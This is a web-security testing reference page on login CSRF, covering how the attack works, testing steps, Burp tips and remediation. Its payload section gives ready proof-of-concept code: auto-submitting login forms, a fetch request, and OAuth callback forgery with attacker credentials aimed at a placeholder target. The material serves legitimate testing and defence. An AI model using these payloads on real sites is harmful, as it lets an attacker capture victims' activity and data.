# Login CSRF

## Overview
Login CSRF (Cross-Site Request Forgery on the login form) allows an attacker to force a victim's browser to log in to an application using the attacker's credentials. Unlike standard CSRF (which targets authenticated users), Login CSRF operates on the unauthenticated login form — if CSRF protection is absent there, the attacker can trick the victim into being authenticated as the attacker. This enables session swapping attacks where the attacker can observe the victim's activity in the attacker's own account context.

## How It Works
- Standard CSRF protections (CSRF tokens, SameSite cookies) are often only applied to state-changing actions that require authentication — the login form is frequently overlooked.
- An attacker creates a malicious page with an auto-submitting form targeting the victim's application's login endpoint, pre-filled with the attacker's credentials.
- When the victim visits the attacker's page, their browser submits the login form, authenticating them as the attacker.
- The victim, unaware, uses the application thinking they're in their own account — any data they enter (personal info, payment details, searches) appears in the attacker's account.
- Particularly dangerous when combined with OAuth: an attacker initiates an OAuth flow for their account and tricks the victim into completing it, linking the attacker's OAuth identity to the victim's account.

## Impact
- Session swapping — victim operates in the attacker's account context, unknowingly revealing their activity to the attacker.
- Persistent data theft — if the victim enters sensitive data (addresses, payment methods, health information) into what they believe is their account.
- Account linking — attacker links their external identity (Google, GitHub) to the victim's account via OAuth CSRF.
- Privilege abuse — if the victim is an admin who then uses admin features while logged into the attacker's account.

## Where to Look
- The login form endpoint — is a CSRF token required?
- The login form HTML — is there a hidden `_csrf`, `csrf_token`, or similar field?
- The login form submitted via GET (trivially exploitable via `<img src="...">`).
- API login endpoints — often completely without CSRF protection.
- `SameSite` attribute on session cookies: `None` = CSRF possible, `Lax` = limited protection, `Strict` = protected.
- OAuth "Login with..." buttons that initiate a flow without a `state` parameter.

## Testing Steps
1. Navigate to the login page and view the page source — check for a hidden CSRF token field in the form.
2. Intercept the login POST request in Burp — check if a `csrf_token`, `_token`, or `nonce` parameter is included and required.
3. Remove the CSRF token from the login request in Repeater and resubmit — if it succeeds, CSRF protection is absent on login.
4. Attempt the login request from a different origin (cross-site): create an HTML form page and submit it — observe if the session cookie's `SameSite` attribute blocks this.
5. Check the `SameSite` attribute on the session cookie — `SameSite=None` or absent `SameSite` makes cross-site form submission possible.
6. Craft a complete PoC HTML page with an auto-submitting login form and test it from a different domain.
7. For OAuth, check if the `state` parameter is present and validated — absent state = OAuth CSRF risk.

## Payloads / Techniques

Basic Login CSRF PoC HTML:
```html
<!DOCTYPE html>
<html>
<head><title>Login CSRF PoC</title></head>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/login" method="POST">
    <input type="hidden" name="username" value="attacker@evil.com">
    <input type="hidden" name="password" value="AttackerPassword123!">
    <!-- If CSRF token required but predictable or missing: -->
    <!-- <input type="hidden" name="csrf_token" value=""> -->
  </form>
  <p>Loading...</p>
</body>
</html>
```

AJAX-based CSRF (if CORS allows):
```html
<script>
fetch('https://target.com/api/auth/login', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    username: 'attacker@evil.com',
    password: 'AttackerPassword123!'
  })
}).then(r => r.json()).then(d => console.log(d));
</script>
```

Test CSRF protection via Burp Repeater (remove token):
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Origin: https://attacker.com
Referer: https://attacker.com/evil.html

username=attacker%40evil.com&password=AttackerPass123!
# Note: no csrf_token parameter
```

Check SameSite cookie attribute:
```bash
curl -sv -X POST https://target.com/login \
  -d "username=test&password=test" 2>&1 \
  | grep -i "set-cookie"
# Look for: SameSite=Strict (protected) vs SameSite=Lax (partial) vs None/absent (vulnerable)
```

OAuth Login CSRF (missing state):
```html
<!-- Attacker initiates their own OAuth flow, captures the redirect URL, -->
<!-- then tricks victim into completing it -->
<img src="https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE&state=" width="0">
<!-- or via form:-->
<form action="https://target.com/oauth/callback" method="GET">
  <input name="code" value="ATTACKER_AUTH_CODE">
  <input name="state" value="">
</form>
<script>document.forms[0].submit();</script>
```

Verify CSRF token absence on API login:
```bash
curl -X POST https://target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -H "Origin: https://evil.com" \
  -d '{"email":"attacker@evil.com","password":"AttackerPass123!"}' \
  -v 2>&1 | grep -E "HTTP|set-cookie|location"
```

## Burp Suite Tips
- In **Proxy**, intercept the login POST request; send it to **Repeater** and remove the CSRF token — if the login succeeds, CSRF protection is absent.
- Use **Proxy** → **Intercept** and change the `Origin` and `Referer` headers to `https://evil.com` in the login request — observe if the server rejects it based on origin checking.
- The **Generate CSRF PoC** feature (right-click in Proxy or Repeater → Engagement Tools → Generate CSRF PoC) creates an HTML page that can be opened in a browser for end-to-end testing.
- **CSRF Scanner** (Burp Pro Scanner) automatically tests login and other endpoints for CSRF vulnerabilities.
- Check the **Response Headers** for any CORS headers (`Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`) that might allow AJAX-based CSRF.
- In **Sequencer**, analyze the CSRF token on the login page to determine if it's cryptographically random or predictable.

## Tools
- **Burp Suite** — CSRF PoC generation, token removal testing, origin checking.
- **OWASP ZAP** — Active scanner includes CSRF detection rules.
- **XSRFProbe** — Automated CSRF auditing tool.
- **Browser DevTools** — Inspect cookie `SameSite` attribute and form submission behavior.

## Remediation
- Apply CSRF tokens (synchronizer token pattern) to the login form — not just to authenticated forms.
- Use `SameSite=Strict` or `SameSite=Lax` on all cookies, including pre-authentication session cookies.
- Validate the `Origin` and `Referer` headers server-side on the login endpoint — reject requests from unexpected origins.
- Implement a `state` parameter in OAuth flows and validate it strictly on callback.
- For API login endpoints, require the `Content-Type: application/json` header (which browsers cannot set in cross-origin form submissions) and reject `application/x-www-form-urlencoded`.
- Educate developers that CSRF protection is needed on the login endpoint specifically.

## References
https://owasp.org/www-community/attacks/csrf
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
https://portswigger.net/web-security/csrf
https://cwe.mitre.org/data/definitions/352.html
https://web.dev/samesite-cookies-explained/
